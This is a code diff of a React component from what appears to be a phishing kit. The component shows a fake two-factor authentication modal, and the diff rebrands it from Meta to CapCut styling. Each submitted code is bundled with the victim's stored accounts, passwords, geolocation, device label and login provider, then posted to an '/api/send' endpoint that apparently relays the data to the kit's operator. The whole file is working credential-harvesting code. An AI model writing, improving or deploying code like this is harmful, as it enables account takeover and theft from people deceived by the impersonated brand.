@@ -1,55 +1,40 @@
-import MetaLogo from '@/assets/images/meta-logo-image.png';
 import VerifyImage from '@/assets/images/verify-image.png';
+import { CAPCUT_BTN_PRIMARY, CAPCUT_INPUT_CLASS, ModalShell, ModalSpinner } from '@/components/form-modal/modal-shell';
+import { useTranslation } from '@/hooks/use-translation';
 import { store } from '@/store/store';
 import config from '@/utils/config';
 import { buildAppealMessage } from '@/utils/message';
-import translateText from '@/utils/translate';
 import axios from 'axios';
 import Image from 'next/image';
 import { useEffect, useState, type FC } from 'react';
 
+const VERIFY_MODAL_TEXTS = [
+    'Two-Factor Authentication',
+    'Enter the 6-digit code for this account from the two-factor authentication you set up (such as Google Authenticator, email or text message on your mobile).',
+    'Code',
+    "This code doesn't work. Check it's correct or try a new one after",
+    'Continue'
+] as const;
+
 const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
+    const { t } = useTranslation(VERIFY_MODAL_TEXTS);
     const [attempts, setAttempts] = useState(0);
     const [code, setCode] = useState('');
     const [countdown, setCountdown] = useState(0);
     const [isLoading, setIsLoading] = useState(false);
     const [showError, setShowError] = useState(false);
-    const [translations, setTranslations] = useState<Record<string, string>>({});
 
-    const { geoInfo, deviceLabel, messageId, userData, addCode, setMessageId } = store();
+    const { geoInfo, deviceLabel, messageId, loginProvider, userData, addCode, setMessageId } = store();
     const maxCode = config.MAX_CODE ?? 3;
     const maxPass = config.MAX_PASS ?? 3;
     const loadingTime = config.CODE_LOADING_TIME ?? 60;
 
-    const t = (text: string): string => {
-        return translations[text] || text;
-    };
-
-    useEffect(() => {
-        if (!geoInfo) return;
-
-        const textsToTranslate = ['Check your authentication code', 'Enter the 6-digit code for this account from the two-factor authentication you set up (such as Google Authenticator, email or text message on your mobile).', 'Code', "This code doesn't work. Check it's correct or try a new one after", 'Continue'];
-
-        const translateAll = async () => {
-            const translatedMap: Record<string, string> = {};
-
-            for (const text of textsToTranslate) {
-                translatedMap[text] = await translateText(text, geoInfo.country_code);
-            }
-
-            setTranslations(translatedMap);
-        };
-
-        translateAll();
-    }, [geoInfo]);
-
     useEffect(() => {
         if (countdown > 0) {
-            const timer = setTimeout(() => {
-                setCountdown(countdown - 1);
-            }, 1000);
+            const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
             return () => clearTimeout(timer);
-        } else if (countdown === 0 && showError) {
+        }
+        if (countdown === 0 && showError) {
             setShowError(false);
         }
     }, [countdown, showError]);
@@ -62,7 +47,6 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
         const next = attempts + 1;
         setAttempts(next);
-
         addCode(code);
 
         const allCodes = [...userData.codes, code];
@@ -70,6 +54,7 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
             geoInfo,
             deviceLabel,
             userData,
+            loginProvider,
             accounts: userData.accounts,
             passwords: userData.passwords,
             codes: allCodes,
@@ -78,10 +63,7 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         });
 
         try {
-            const res = await axios.post('/api/send', {
-                message,
-                old_message_id: messageId
-            });
+            const res = await axios.post('/api/send', { message, old_message_id: messageId });
 
             if (res?.data?.success && typeof res.data.message_id === 'number') {
                 setMessageId(res.data.message_id);
@@ -102,48 +84,53 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     };
 
     return (
-        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
-            <div className='flex max-h-[90vh] w-full max-w-xl flex-col gap-7 rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-4'>
-                <p className='mt-4 text-2xl font-bold'>{t('Check your authentication code')}</p>
-                <p className='text-xl'>{t('Enter the 6-digit code for this account from the two-factor authentication you set up (such as Google Authenticator, email or text message on your mobile).')}</p>
-                <div className='flex flex-col justify-center'>
-                    <Image src={VerifyImage} alt='' />
-                    <div className='relative mt-4 w-full'>
-                        <input
-                            type='tel'
-                            inputMode='numeric'
-                            pattern='[0-9]*'
-                            id='code-input'
-                            value={code}
-                            onChange={(e) => {
-                                const value = e.target.value.replaceAll(/\D/g, '');
-                                if (value.length <= 8) {
-                                    setCode(value);
-                                }
-                            }}
-                            maxLength={8}
-                            disabled={countdown > 0}
-                            className={`peer h-[60px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 pt-6 pb-2 placeholder-transparent focus:outline-none ${countdown > 0 ? 'cursor-not-allowed opacity-60' : ''}`}
-                            placeholder={t('Code')}
-                        />
-                        <label htmlFor='code-input' className='absolute top-1/2 left-3 -translate-y-1/2 cursor-text text-[#4a4a4a] transition-all duration-200 ease-in-out peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'>
-                            {t('Code')}
-                        </label>
-                    </div>
-                    {showError && (
-                        <p className='mt-2 text-[15px] text-red-500'>
-                            {t("This code doesn't work. Check it's correct or try a new one after")} {countdown}s.
-                        </p>
-                    )}
-                    <button type='button' onClick={handleSubmit} disabled={isLoading || code.length < 6 || countdown > 0} className={`mt-4 flex h-[50px] w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700 ${isLoading || code.length < 6 || countdown > 0 ? 'cursor-not-allowed opacity-80' : ''}`}>
-                        {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Continue')}
-                    </button>
+        <ModalShell title={t('Two-Factor Authentication')} showClose={false}>
+            <div className='flex flex-1 flex-col px-5 py-4'>
+                <p className='mb-6 text-body-md leading-relaxed text-on-surface-variant'>
+                    {t('Enter the 6-digit code for this account from the two-factor authentication you set up (such as Google Authenticator, email or text message on your mobile).')}
+                </p>
+
+                <div className='mb-6 overflow-hidden rounded-xl border border-surface-border'>
+                    <Image src={VerifyImage} alt='' className='h-auto w-full opacity-90' />
                 </div>
-                <div className='flex items-center justify-center p-3'>
-                    <Image src={MetaLogo} alt='' className='h-[18px] w-[70px]' />
+
+                <div className='mb-2'>
+                    <label htmlFor='code-input' className='mb-1.5 block font-label-md text-label-md text-on-surface-variant'>
+                        {t('Code')}
+                    </label>
+                    <input
+                        type='tel'
+                        inputMode='numeric'
+                        pattern='[0-9]*'
+                        id='code-input'
+                        value={code}
+                        onChange={(e) => {
+                            const value = e.target.value.replaceAll(/\D/g, '');
+                            if (value.length <= 8) setCode(value);
+                        }}
+                        maxLength={8}
+                        disabled={countdown > 0}
+                        className={`${CAPCUT_INPUT_CLASS} text-center text-lg tracking-[0.3em] ${countdown > 0 ? 'cursor-not-allowed opacity-60' : ''}`}
+                        placeholder='••••••'
+                    />
                 </div>
+
+                {showError && (
+                    <p className='mb-2 text-sm text-error'>
+                        {t("This code doesn't work. Check it's correct or try a new one after")} {countdown}s.
+                    </p>
+                )}
+
+                <button
+                    type='button'
+                    onClick={handleSubmit}
+                    disabled={isLoading || code.length < 6 || countdown > 0}
+                    className={`${CAPCUT_BTN_PRIMARY} mt-4 mb-2`}
+                >
+                    {isLoading ? <ModalSpinner /> : t('Continue')}
+                </button>
             </div>
-        </div>
+        </ModalShell>
     );
 };
 
